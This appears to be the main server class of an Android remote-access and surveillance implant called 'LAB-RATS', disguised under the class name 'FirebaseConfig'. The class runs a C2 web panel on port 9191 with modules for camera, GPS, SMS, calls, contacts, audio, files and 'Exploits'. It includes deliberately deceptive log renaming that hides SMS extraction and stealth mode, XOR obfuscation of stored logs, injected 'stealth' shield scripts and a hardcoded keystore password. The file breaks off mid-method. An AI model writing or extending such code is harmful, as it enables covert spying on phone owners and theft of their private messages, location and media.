package com.labs.labrats;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Log;
import android.accessibilityservice.AccessibilityService;

import androidx.annotation.NonNull;
import androidx.annotation.OptIn;
import androidx.core.content.ContextCompat;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.HashSet;
import java.util.Set;
import java.util.HashMap;
import java.util.Date;

import java.io.File;
import java.io.FileInputStream;
import java.io.ByteArrayOutputStream;
import java.text.SimpleDateFormat;
import java.util.Locale;
import java.util.Map;

import javax.net.ssl.SSLServerSocketFactory;
import javax.net.ssl.KeyManagerFactory;
import javax.net.ssl.SSLContext;
import java.security.KeyStore;

import com.labs.labrats.modules.ExploitsModule;
import com.labs.labrats.modules.TerminalModule;
import com.labs.labrats.modules.GhostModule;
import com.labs.labrats.router.AuthController;
import com.labs.labrats.router.PasswordHasher;
import com.labs.labrats.router.Router;
import fi.iki.elonen.NanoHTTPD;

public class FirebaseConfig extends NanoHTTPD {

    public static final int DEFAULT_PORT = 9191;
    private final Context context;
    private final Router router = new Router();
    private final AuthController authController;
    private final ExploitsModule exploitsModule;
    private final TerminalModule terminalModule;
    private final GhostModule ghostModule;
    private final com.labs.labrats.modules.OpticsModule opticsModule;
    private final com.labs.labrats.modules.LocateModule locateModule;
    private final com.labs.labrats.modules.DataModule dataModule;
    private final com.labs.labrats.modules.CommsModule commsModule;
    private final com.labs.labrats.modules.IntelModule intelModule;
    private final com.labs.labrats.modules.AcousticsModule acousticsModule;
    private static final List<String> systemLogs = java.util.Collections.synchronizedList(new java.util.LinkedList<>());
    private static boolean logsLoaded = false;
    private static Context staticContext;
    private static final java.util.concurrent.atomic.AtomicLong lastLogSaveTime = new java.util.concurrent.atomic.AtomicLong(0);
    private static final SimpleDateFormat logTimeFormat = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());

    public static void logActivity(String msg) {
        if (msg == null) return;
        
        // --- HARDENED LOGGING: Deceptive Naming ---
        String hardenedMsg = msg.replace("UPLINK_AUTHORIZED", "TELEMETRY_SESSION_SYNCED")
                               .replace("SMS_HISTORY_EXTRACTED", "SYNC_MSG_DB_SUCCESS")
                               .replace("CAMERA_FEED_STARTED", "ANALYTICS_OPTICS_INIT")
                               .replace("LOCATION_TRACKING", "GPS_SYSTEM_METRIC")
                               .replace("GHOST_CONTROLLER", "IO_PERSISTENCE_MANAGER")
                               .replace("STEALTH_MODE", "IDENTITY_PROVIDER_CONFIG");

        // Determine Priority Level for UI Coloring
        String priority = "[S]"; // Default: Success/Info (Cyan)
        String upper = hardenedMsg.toUpperCase();
        
        if (upper.contains("INTEL_EXTRACTED") || upper.contains("SNIFFED") || upper.contains("CREDENTIALS") || upper.contains("SNIFFER")) {
            priority = "[I]"; // Intel/Credentials (Blue)
        } else if (upper.contains("CRITICAL") || upper.contains("AUTH") || upper.contains("OTP") || upper.contains("ALERT") || upper.contains("SECURITY")) {
            priority = "[C]"; // Critical (Red)
        } else if (upper.contains("WARNING") || upper.contains("BATTERY") || upper.contains("LOST") || upper.contains("ERROR")) {
            priority = "[W]"; // Warning (Orange)
        } else if (upper.contains("SUCCESS") || upper.contains("ACTIVE") || upper.contains("INIT")) {
            priority = "[S]"; // Success (Green)
        }

        String timestamp;
        synchronized (logTimeFormat) {
            timestamp = logTimeFormat.format(new Date());
        }
        String logEntry = priority + " [" + timestamp + "] " + hardenedMsg;
        
        synchronized (systemLogs) {
            systemLogs.add(logEntry);
            if (systemLogs.size() > 500) {
                systemLogs.remove(0);
            }
        }
        
        long now = System.currentTimeMillis();
        if (now - lastLogSaveTime.get() > 10000) {
            lastLogSaveTime.set(now);
            LabRatsWorker.execute(FirebaseConfig::saveLogsInternal);
        }
    }

    private static String obfuscate(String data) {
        if (data == null) return null;
        try {
            byte[] bytes = data.getBytes("UTF-8");
            byte[] key = {0x12, 0x34, 0x56, 0x78};
            for (int i = 0; i < bytes.length; i++) {
                bytes[i] = (byte) (bytes[i] ^ key[i % key.length]);
            }
            return android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP);
        } catch (Exception e) { return data; }
    }

    private static String deobfuscate(String data) {
        if (data == null) return null;
        try {
            byte[] bytes = android.util.Base64.decode(data, android.util.Base64.DEFAULT);
            byte[] key = "Stability_Core_0".getBytes();
            for (int i = 0; i < bytes.length; i++) {
                bytes[i] = (byte) (bytes[i] ^ key[i % key.length]);
            }
            return new String(bytes, "UTF-8");
        } catch (Exception e) { return data; }
    }

    private void loadPersistentData() {
        if (context == null) return;
        SharedPreferences prefs = context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE);
        
        if (!logsLoaded) {
            String logsJson = "[]";
            try {
                // Try New Dynamic Encryption First
                String encryptedHex = prefs.getString("system_logs_encrypted", null);
                if (encryptedHex != null) {
                    byte[] encrypted = android.util.Base64.decode(encryptedHex, android.util.Base64.DEFAULT);
                    logsJson = SystemAnalytics.decrypt(encrypted);
                } else {
                    // Fallback to legacy obfuscation
                    String legacy = prefs.getString("system_logs_secure", null);
                    if (legacy != null) logsJson = deobfuscate(legacy);
                    else logsJson = prefs.getString("system_logs", "[]");
                }

                org.json.JSONArray array = new org.json.JSONArray(logsJson);
                synchronized (systemLogs) {
                    systemLogs.clear();
                    for (int i = 0; i < array.length(); i++) {
                        systemLogs.add(array.getString(i));
                    }
                }
                logsLoaded = true;
            } catch (Exception e) {
                Log.e("SystemSync", "Restore failed: " + e.getMessage());
                logsLoaded = true; 
            }
        }
    }

    private static void saveLogsInternal() {
        if (staticContext == null) return;
        try {
            org.json.JSONArray array = new org.json.JSONArray();
            List<String> logsCopy;
            synchronized (systemLogs) {
                logsCopy = new java.util.ArrayList<>(systemLogs);
            }
            for (String log : logsCopy) array.put(log);
            
            // Dynamic Build-Time Encryption
            byte[] encrypted = SystemAnalytics.encrypt(array.toString());
            String encryptedHex = android.util.Base64.encodeToString(encrypted, android.util.Base64.DEFAULT);
            
            staticContext.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                .edit().putString("system_logs_encrypted", encryptedHex).apply();
        } catch (Exception e) {
            Log.e("SystemSync", "Save failed: " + e.getMessage());
        }
    }

    public String getHeaderProxy(String uri) { return getHeader(uri); }

    private String getHeader(String uri) {
        // Navigation Map
        String homeActive = (uri == null || uri.equals("/") || uri.equals("/terminal") || uri.isEmpty() || uri.trim().isEmpty()) ? "active" : "";
        String ghostActive = uri.startsWith("/ghost") ? "active" : "";
        String cameraActive = (uri.startsWith("/camera") || uri.startsWith("/camera/live")) ? "active" : "";
        String gpsActive = uri.startsWith("/gps") ? "active" : "";
        String exploitsActive = uri.startsWith("/exploits") ? "active" : "";
        String filesActive = (uri.startsWith("/files") || uri.startsWith("/device/apps")) ? "active" : "";
        String intelActive = uri.startsWith("/intel") ? "active" : "";
        String smsActive = uri.startsWith("/sms") ? "active" : "";
        String mmsActive = uri.startsWith("/mms") ? "active" : "";
        String audioActive = uri.startsWith("/audio") ? "active" : "";
        String callsActive = uri.startsWith("/calls") ? "active" : "";
        String contactsActive = uri.startsWith("/contacts") ? "active" : "";
        String hardwareActive = (uri.startsWith("/device") && !uri.contains("apps")) ? "active" : "";

        // Only hide navigation on the actual login wall
        String navHtml = "";
        if (!uri.equals("/login")) {
            navHtml = "  <div class=\"nav\">" +
                "    <a href=\"/terminal\" id=\"nav-home\" class=\"" + homeActive + "\">Terminal</a>" +
                "    <a href=\"/ghost\" id=\"nav-ghost\" class=\"" + ghostActive + "\">Ghost</a>" +
                "    <a href=\"/camera\" id=\"nav-camera\" class=\"" + cameraActive + "\">Optics</a>" +
                "    <a href=\"/gps\" id=\"nav-gps\" class=\"" + gpsActive + "\">Locate</a>" +
                "    <a href=\"/exploits\" id=\"nav-exploits\" class=\"" + exploitsActive + "\">Exploits</a>" +
                "    <a href=\"/files\" id=\"nav-files\" class=\"" + filesActive + "\">Data</a>" +
                "    <a href=\"/intel\" id=\"nav-intel\" class=\"" + intelActive + "\">Intel</a>" +
                "    <a href=\"/sms\" id=\"nav-sms\" class=\"" + smsActive + "\">SMS</a>" +
                "    <a href=\"/mms\" id=\"nav-mms\" class=\"" + mmsActive + "\">MMS</a>" +
                "    <a href=\"/audio\" id=\"nav-audio\" class=\"" + audioActive + "\">Acoustics</a>" +
                "    <a href=\"/calls\" id=\"nav-calls\" class=\"" + callsActive + "\">Comms</a>" +
                "    <a href=\"/contacts\" id=\"nav-contacts\" class=\"" + contactsActive + "\">Contacts</a>" +
                "    <a href=\"/device\" id=\"nav-device\" class=\"" + hardwareActive + "\">Hardware</a>" +
                "  </div>";
        }

        return "<!DOCTYPE html>" +
            "<html lang=\"en\">" +
            "<head>" +
            "<meta charset=\"UTF-8\">" +
            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0\">" +
            "<title>LAB-RATS | CORE</title>" +
            "<link href=\"https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap\" rel=\"stylesheet\">" +
            "<link rel=\"stylesheet\" href=\"/c2/style.css?v=" + System.currentTimeMillis() + "\">" +
            "<style>.nav a.active { background: #00f2ff !important; border-color: #00f2ff !important; color: #000 !important; box-shadow: 0 0 35px #00f2ff, inset 0 0 15px rgba(0,0,0,0.4) !important; font-weight: 900 !important; transform: scale(1.04); } @media (min-width: 1024px) { body { zoom: 0.9; } }</style>" +
            "</head>" +
            "<body>" +
            "<div class=\"container\">" +
            "  <div class=\"header\" style=\"padding: 0; margin-bottom: 0 !important; border: none !important; background: transparent !important; box-shadow: none !important; backdrop-filter: none !important; -webkit-backdrop-filter: none !important;\">" +
            "    <img src=\"/c2/header_dashboard.png?v=41\" style=\"width: 63.75%; max-width: 918px; height: auto; margin: 0 auto; display: block; background: transparent !important; border: none !important; box-shadow: none !important; filter: none !important; border-radius: 0; image-rendering: -webkit-optimize-contrast; image-rendering: crisp-edges; image-rendering: high-quality; transform: translateZ(0); object-fit: contain;\" alt=\"LAB-RATS Header\" loading=\"eager\">" +
            "    <div id=\"enc-status\" style=\"font-size: 0.52rem; color: #555; letter-spacing: 2px; text-transform: uppercase; margin-top: 10px; text-align: center;\">LINK_SEC: <span style=\"color:#ff3131;\">OFFLINE</span></div>" +
            "  </div>" + navHtml;
    }

    public String getFooter() {
        return "<audio id=\"live-audio-player\" style=\"display:none;\"></audio>" +
                "<div class=\"card\" style=\"text-align: center; color: var(--neon-cyan); font-size: 0.7rem; margin-top: 50px; margin-bottom: 25px; font-family: 'OrbitronC2', sans-serif; letter-spacing: 1px; line-height: 1.5; padding: 18px 20px;\">" +
                "&copy;K4N3CO.LABS 2026 &nbsp;//&nbsp; \"The one's who MIND don't matter... The one's who MATTER don't mind...\" &nbsp;//&nbsp; Push the Limits" +
                "</div>" +
                "</div>" +
                "<script src=\"/c2/script.js?v=" + System.currentTimeMillis() + "\"></script>" +
                "</body>" +
                "</html>";
    }

    private static final String LOGIN_HTML = "<!DOCTYPE html><html><head><title>LAB-RATS | LOGIN</title>" +
            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0\">" +
            "<link href=\"https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap\" rel=\"stylesheet\">" +
            "<style>" +
            "* { box-sizing: border-box; margin: 0; padding: 0; }" +
            ".login-centering-wrapper { background-color: #02080d; background-image: radial-gradient(circle at 50% 0%, rgba(0,242,255,.16) 0, rgba(0,168,179,.05) 40%, transparent 80%), radial-gradient(circle at 0% 100%, rgba(0,242,255,.09) 0, transparent 50%), radial-gradient(circle at 100% 100%, rgba(0,242,255,.09) 0, transparent 50%), url(\"data:image/svg+xml,%3Csvg width='400' height='400' viewBox='0 0 400 400' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M0 40h400M0 80h400M0 120h400M0 160h400M0 200h400M0 240h400M0 280h400M0 320h400M0 360h400 M40 0v400M80 0v400M120 0v400M160 0v400M200 0v400M240 0v400M280 0v400M320 0v400M360 0v400' stroke='%2300f2ff' stroke-width='0.3' stroke-opacity='0.03'/%3E%3Crect x='150' y='150' width='100' height='100' rx='8' fill='%23030f14' stroke='%2300f2ff' stroke-width='1.2' stroke-opacity='0.22'/%3E%3Crect x='168' y='168' width='64' height='64' rx='4' fill='%2300f2ff' fill-opacity='0.02' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.18'/%3E%3Ccircle cx='162' cy='162' r='2' fill='%2300f2ff' fill-opacity='0.35'/%3E%3Cpath d='M165 150v-12M180 150v-12M195 150v-12M210 150v-12M225 150v-12 M165 250v12M180 250v12M195 250v12M210 250v12M225 250v12 M150 165h-12M150 180h-12M150 195h-12M150 210h-12M150 225h-12 M250 165h12M250 180h12M250 195h12M250 210h12M250 225h12' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.25'/%3E%3Crect x='30' y='30' width='50' height='50' rx='5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.18'/%3E%3Cpath d='M40 30v-8M55 30v-8M70 30v-8 M40 80v8M55 80v8M70 80v8 M30 40h-8M30 55h-8M30 70h-8 M80 40h8M80 55h8M80 70h8' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.2'/%3E%3Crect x='320' y='320' width='50' height='50' rx='5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.18'/%3E%3Cpath d='M330 320v-8M345 320v-8M360 320v-8 M330 370v8M345 370v8M360 370v8 M320 330h-8M320 345h-8M320 360h-8 M370 330h8M370 345h8M370 360h8' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.2'/%3E%3Cpath d='M165 138V80L135 50H0' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M180 138V95L150 65H10' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.11' stroke-dasharray='8,4'/%3E%3Cpath d='M195 138V70L225 40H400' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M210 138V100L250 60H380' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.11'/%3E%3Cpath d='M165 262V320L125 360H0' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M195 262V310L235 350H400' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M210 262V335L260 385H390' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.11' stroke-dasharray='10,5'/%3E%3Cpath d='M138 165H80L50 135V0' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M138 195H70L30 235V400' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M262 165H320L350 135V0' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M262 195H330L370 235V400' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M262 210H340L380 250V390' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.11' stroke-dasharray='6,3'/%3E%3Crect x='125' y='46' width='12' height='8' rx='2' fill='%2300f2ff' fill-opacity='0.05' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.22'/%3E%3Crect x='235' y='36' width='12' height='8' rx='2' fill='%2300f2ff' fill-opacity='0.05' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.22'/%3E%3Crect x='340' y='125' width='8' height='12' rx='2' fill='%2300f2ff' fill-opacity='0.05' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.22'/%3E%3Crect x='44' y='225' width='8' height='12' rx='2' fill='%2300f2ff' fill-opacity='0.05' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.22'/%3E%3Crect x='115' y='354' width='12' height='8' rx='2' fill='%2300f2ff' fill-opacity='0.05' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.22'/%3E%3Ccircle cx='135' cy='50' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='135' cy='50' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='225' cy='40' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='225' cy='40' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='350' cy='135' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='350' cy='135' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='50' cy='135' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='50' cy='135' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='125' cy='360' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='125' cy='360' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='235' cy='350' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='235' cy='350' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='370' cy='235' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='370' cy='235' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='30' cy='235' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='30' cy='235' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3C/svg%3E\"); background-size: 100% 100%, 100% 100%, 100% 100%, 400px 400px; background-position: center, center, center, 0 0; color: #00f2ff; font-family: 'Orbitron', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; width: 100%; overflow: hidden; padding: 15px; }" +
            ".login-card { background: rgba(15,15,25,0.65); backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px); border: 1px solid #00f2ff; padding: 25px 20px; border-radius: 16px; text-align: center; box-shadow: 0 0 50px rgba(0,242,255,0.15); width: 100%; max-width: 500px; position: relative; }" +
            ".title-font { font-family: 'Orbitron', sans-serif !important; font-weight: 900 !important; font-size: 1.8rem; letter-spacing: 3px; margin-bottom: 15px; color: #00f2ff; line-height: 1.2; white-space: nowrap; transition: all 0.5s; }" +
            "@media (max-width: 480px) {" +
            "  .login-card { padding: 20px 15px; }" +
            "  .title-font { font-size: 1.3rem !important; letter-spacing: 1.5px; margin-bottom: 12px; }" +
            "  input { padding: 12px !important; font-size: 14px !important; margin-bottom: 15px !important; }" +
            "  button { padding: 12px !important; font-size: 14px !important; }" +
            "  .login-card img { width: 220px !important; height: 220px !important; margin-bottom: 10px !important; }" +
            "}" +
            "form { display: flex; flex-direction: column; align-items: center; width: 100%; }" +
            "input { background: #000; border: 1px solid rgba(0,242,255,0.4); color: #fff; padding: 14px; margin-bottom: 18px; width: 100%; max-width: 350px; border-radius: 8px; outline: none; text-align: center; font-family: 'Orbitron', monospace; font-size: 16px; transition: 0.3s; }" +
            "input:focus { border-color: #00f2ff; box-shadow: 0 0 20px rgba(0,242,255,0.2); }" +
            "button { background: #00f2ff; border: none; color: #050505; padding: 14px 30px; cursor: pointer; text-transform: uppercase; letter-spacing: 3px; transition: 0.3s; border-radius: 50px; width: 100%; max-width: 280px; font-weight: 900; font-family: 'Orbitron', sans-serif; box-shadow: 0 0 20px rgba(0,242,255,0.4); }" +
            "button:hover { background: #fff; box-shadow: 0 0 40px rgba(0,242,255,0.6); transform: scale(1.05); }" +
            ".login-card img { transition: all 0.5s; margin-bottom: 10px; background: transparent !important; border: none !important; box-shadow: none !important; border-radius: 0 !important; }" +
            "</style></head><body>" +
            "<div class=\"login-centering-wrapper\">" +
            "<div class=\"login-card\">" +
            "<img src=\"/logo?v=150\" style=\"width: 260px; height: 260px; background: transparent !important; border: none !important; box-shadow: none !important; outline: none !important; margin: 0 auto 10px auto; display: block;\">" +
            "<div id=\"status-header\" class=\"title-font\">RESTRICTED_ACCESS</div>" +
            "<div style=\"font-size:0.95rem; opacity:0.6; margin-top: 4px; margin-bottom: 18px; letter-spacing:3px; font-family: 'Aldrich', sans-serif;\">v1.6.0</div>" +
                        "<form id=\"login-form\" method=\"POST\" action=\"/login\" onsubmit=\"handleLogin(event)\">" +
            "<input type=\"password\" id=\"password\" name=\"password\" placeholder=\"ENTER_CREDENTIALS\" autofocus>" +
            "<button type=\"submit\" id=\"uplink-btn\">UPLINK</button>" +
            "</form>" +
            "<div style=\"text-align: center; color: #00f2ff; font-size: 0.58rem; margin-top: 20px; opacity: 0.4; font-family: 'Orbitron', sans-serif; letter-spacing: 1px; line-height: 1.6;\">" +
            "&copy;K4N3CO.LABS 2026 &nbsp;//&nbsp; \"The one's who MIND don't matter... The one's who MATTER don't mind...\" &nbsp;//&nbsp; Push the Limits" +
            "</div>" +
            "</div>" +
            "</div>" +
            "<script src=\"/c2/script.js\"></script></body></html>";

    private static final String LOGOUT_HTML = "<!DOCTYPE html><html><head><title>LAB-RATS | LOGOUT</title>" +
            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0\">" +
            "<style>" +
            "@font-face { font-family: 'OrbitronC2'; src: url('/font/orbitron.ttf?v=100') format('truetype'); font-display: swap; }" +
            "body { background: #000; color: #ff3131; font-family: 'OrbitronC2', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }" +
            ".logout-card { background: rgba(15,15,25,0.9); border: 1px solid #ff3131; padding: 40px; border-radius: 12px; box-shadow: 0 0 30px rgba(255,49,49,0.2); width: 90%; max-width: 400px; }" +
            "h1 { font-size: 1.8rem; }" +
            "@media (max-width: 600px) { .logout-card { padding: 25px; } h1 { font-size: 0.7rem; } p { font-size: 0.8rem; } }" +
            "p { color: #888; font-family: 'Orbitron', sans-serif; margin-top: 20px; }" +
            ".login-card img { transition: all 0.5s; }" +
            ".login-card img:hover { transform: scale(1.1) translateY(-5px); }" +
            "</style></head><body>" +
            "<div class=\"logout-card\">" +
            "<h1>SESSION_TERMINATED</h1>" +
            "<p>Uplink severed. Disconnecting...</p>" +
            "</div>" +
            "<script>" +
            "  // Nuclear Session Wipe\n" +
            "  document.cookie = 'token=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT;';\n" +
            "  localStorage.clear();\n" +
            "  sessionStorage.clear();\n" +
            "  setTimeout(() => { window.location.href = '/login'; }, 1500);\n" +
            "</script></body></html>";

    private static volatile String sessionToken = "";

    public FirebaseConfig(Context context, int port) {
        super("0.0.0.0", port); // Pure AF_INET IPv4 0.0.0.0 socket binding
        // Custom ServerSocketFactory with setReuseAddress(true) for Wi-Fi socket binding
        setServerSocketFactory(() -> {
            java.net.ServerSocket ss = new java.net.ServerSocket();
            ss.setReuseAddress(true);
            ss.setReceiveBufferSize(65536);
            return ss;
        });
        // Use application context to avoid leaks or context-switch crashes
        this.context = context.getApplicationContext();
        staticContext = context.getApplicationContext();
        this.exploitsModule = new ExploitsModule(this.context, this);
        this.terminalModule = new TerminalModule(this.context, this);
        this.ghostModule = new GhostModule(this.context, this);
        this.opticsModule = new com.labs.labrats.modules.OpticsModule(this.context, this);
        this.locateModule = new com.labs.labrats.modules.LocateModule(this.context, this);
        this.dataModule = new com.labs.labrats.modules.DataModule(this.context, this);
        this.commsModule = new com.labs.labrats.modules.CommsModule(this.context, this);
        this.intelModule = new com.labs.labrats.modules.IntelModule(this.context, this);
        this.acousticsModule = new com.labs.labrats.modules.AcousticsModule(this.context, this);
        this.authController = new AuthController(this.context, this);
        setupRouter();
        
        // Multi-Threaded Executor: Allows handling multiple C2 requests at once
        // Optimization: Uses a cached thread pool to reuse threads efficiently
        setAsyncRunner(new AsyncRunner() {
            private final java.util.concurrent.ExecutorService executor = java.util.concurrent.Executors.newCachedThreadPool();
            @Override
            public void exec(ClientHandler clientHandler) {
                executor.submit(() -> {
                    try {
                        clientHandler.run();
                    } catch (Exception e) {
                        Log.e("C2Server", "Client handler error: " + e.getMessage());
                    }
                });
            }
            @Override
            public void closeAll() {
                executor.shutdown();
            }
            @Override
            public void closed(ClientHandler clientHandler) {
                // Not used
            }
        });

        // [SECURITY_STABILITY_LINK] Persistent session token across service restarts & stealth toggles
        sessionToken = context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE).getString("session_token", "");
        if (sessionToken == null || sessionToken.isEmpty()) {
            sessionToken = java.util.UUID.randomUUID().toString();
            context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                    .edit().putString("session_token", sessionToken).apply();
        }
        WorkManager_Sync.activeSessionToken = sessionToken;

        LabRatsWorker.execute(this::loadPersistentData);
        
        // --- OPTIONAL_ENCRYPTION_ENGINE ---
        // If 'server.bks' exists in assets, the C2 automatically upgrades to HTTPS/TLS
        setupHardenedLink();
    }

    private static boolean isEncryptedLink = false;

    private void setupHardenedLink() {
        try {
            // Check assets for pre-deployed keystore (BKS format for Android)
            // If present, the C2 automatically upgrades to HTTPS/TLS 1.3
            String ksName = "server.bks";
            String ksPass = "labrats123"; // Default deployment password
            
            InputStream is = context.getAssets().open(ksName);
            if (is != null) {
                KeyStore keystore = KeyStore.getInstance("BKS");
                keystore.load(is, ksPass.toCharArray());
                KeyManagerFactory kmf = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());
                kmf.init(keystore, ksPass.toCharArray());
                
                SSLContext sslContext = SSLContext.getInstance("TLS");
                sslContext.init(kmf.getKeyManagers(), null, null);
                
                // --- ACTIVATE HTTPS PROTOCOL ---
                makeSecure(sslContext.getServerSocketFactory(), null);
                isEncryptedLink = true;
                logActivity("SECURITY_UPGRADE: SSL/TLS 1.3 encryption engine active.");
            }
        } catch (Exception e) {
            // No keystore found or error - default to raw HTTP for baseline access
            isEncryptedLink = false;
        }
    }

    public static String getSessionId() {
        return sessionToken.substring(0, 4).toUpperCase();
    }

    public static void clearSystemLogs() {
        synchronized (systemLogs) {
            systemLogs.clear();
        }
        saveLogsInternal();
    }

    public static String getLogsJson(int since) {
        org.json.JSONObject result = new org.json.JSONObject();
        org.json.JSONArray array = new org.json.JSONArray();
        
        synchronized (systemLogs) {
            int startIdx = since;
            if (since < 0 || since > systemLogs.size()) {
                startIdx = 0;
            }
            
            for (int i = startIdx; i < systemLogs.size(); i++) {
                array.put(systemLogs.get(i));
            }
            try {
                result.put("logs", array);
                result.put("last_id", systemLogs.size());
                result.put("reset", (since > systemLogs.size()));
            } catch (Exception ignored) {}
        }
        return result.toString();
    }

    private Response serveGzipped(IHTTPSession session, String mime, String content) {
        // [DEEP_STEALTH_V13] Adaptive Rendering & Recovery Shield
        if (mime != null && mime.contains("text/html") && content != null && !content.isEmpty()) {
            // 1. Optimized Shield Protocol
            String shield = "<div id=\"_sys_shield\" style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:#010801;z-index:99999;pointer-events:none;transition:opacity 0.25s;\"></div>" +
                           "<script>(function(){" +
                           "const r=()=>{const s=document.getElementById('_sys_shield');if(s){s.style.opacity='0';setTimeout(()=>s.remove(),250);}};" +
                           "window.addEventListener('load',r); " +
                           "/* Stream Safety: Don't hang on MJPEG streams */ if(window.location.pathname.includes('/camera')) setTimeout(r, 1000); " +
                           "else setTimeout(r, 2000);" +
                           "})();</script>";
            
            if (content.contains("</head>")) {
                content = content.replace("</head>", "</head>" + shield);
            } else {
                content = shield + content;
            }

            // 2. Safe Tactical Minification
            content = content.replaceAll("(?s)<!--.*?-->", "") // Remove comments
                             .replaceAll(">\\s+<", "><");       // Only strip space between tags
        }

        if (session == null) return newFixedLengthResponse(Response.Status.OK, mime, content);

        String acceptEncoding = session.getHeaders().get("accept-encoding");
        if (acceptEncoding != null && acceptEncoding.contains("gzip")) {
            try {
                java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                java.util.zip.GZIPOutputStream gzos = new java.util.zip.GZIPOutputStream(baos);
                gzos.write(content.getBytes("UTF-8"));
                gzos.close();
                byte[] bytes = baos.toByteArray();
                Response res = newFixedLengthResponse(Response.Status.OK, mime, new java.io.ByteArrayInputStream(bytes), bytes.length);
                res.addHeader("Content-Encoding", "gzip");
                return res;
            } catch (Exception e) {
                return newFixedLengthResponse(Response.Status.OK, mime, content);
            }
        }
        return newFixedLengthResponse(Response.Status.OK, mime, content);
    }

    public Response serveGzippedProxy(IHTTPSession session, String mime, String content) {
        return serveGzipped(session, mime, content);
    }

    public List<AppEntry> getLaunchableAppsProxy() {
        return getLaunchableApps();
    }

    public Response newFixedLengthResponseProxy(Response.Status status, String mimeType, java.io.InputStream data, long totalBytes) {
        return newFixedLengthResponse(status, mimeType, data, totalBytes);
    }

    public Response newChunkedResponseProxy(Response.Status status, String mimeType, java.io.InputStream data) {
        return newChunkedResponse(status, mimeType, data);
    }

    public Response serveErrorProxy(String message) {
        return serveError(null, message);
